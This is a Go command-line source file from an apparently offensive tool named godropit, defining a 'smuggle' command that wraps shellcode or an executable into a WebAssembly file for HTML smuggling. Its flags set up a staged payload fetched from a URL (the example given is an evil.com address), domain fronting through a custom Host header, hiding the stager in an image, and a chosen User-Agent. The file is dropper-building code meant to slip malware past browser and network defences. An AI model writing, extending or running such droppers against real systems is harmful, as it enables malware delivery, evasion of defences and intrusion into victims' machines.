/*
Copyright © 2023 Phil Kopp
*/
package cmd

import (
	"log"

	"github.com/kopp0ut/godropit/pkg/gengo"

	"github.com/spf13/cobra"
)

// smuggleCmd represents the local command
var smuggleCmd = &cobra.Command{
	Use:   "smuggle",
	Short: "Generate a smuggled payload that can be imported to any web page with wasm.",
	Long: `Generates a wasm file which can be used for smuggling. This uses gowasm and is super experimental.
	It does technically support staging but this needs to be used with caution, browsers may vary in how they retrieve URLs. `,
	Run: func(cmd *cobra.Command, args []string) {
		if input == "" {
			log.Fatalln("Please pass the file you wish to smuggle with -i <smugglefile.txt>")
		}
		if debug {
			gengo.Debug = true
		}
		gengo.NewSmuggler(name, input, output, stagerurl, imgpath, hostname, ua)
	},
}

func init() {
	rootCmd.AddCommand(smuggleCmd)

	smuggleCmd.PersistentFlags().StringVarP(&input, "in", "i", "", "input file, shellcode.bin or exe.")
	smuggleCmd.MarkFlagRequired("in")
	smuggleCmd.PersistentFlags().StringVarP(&name, "name", "n", "godropit", "droppername, don't include file extension.")
	smuggleCmd.MarkFlagRequired("name")
	smuggleCmd.PersistentFlags().StringVarP(&output, "out", "o", "", "output directory for your generated files.")
	smuggleCmd.MarkFlagRequired("out")

	smuggleCmd.PersistentFlags().StringVarP(&stagerurl, "url", "u", "", "URL to use for a staged payload. E.g. https://evil.com/test.png. Setting this flag will make the payload staged.")
	smuggleCmd.PersistentFlags().StringVar(&hostname, "host", "", "[optional] Host header to use, handy for domain fronts. E.g. evil.com")
	smuggleCmd.PersistentFlags().StringVar(&imgpath, "img", "", "input image (filepath) to hide your stager. e.g. ~/benign.png")
	smuggleCmd.PersistentFlags().StringVar(&ua, "ua", "", "User-Agent to use with payload. ")
}
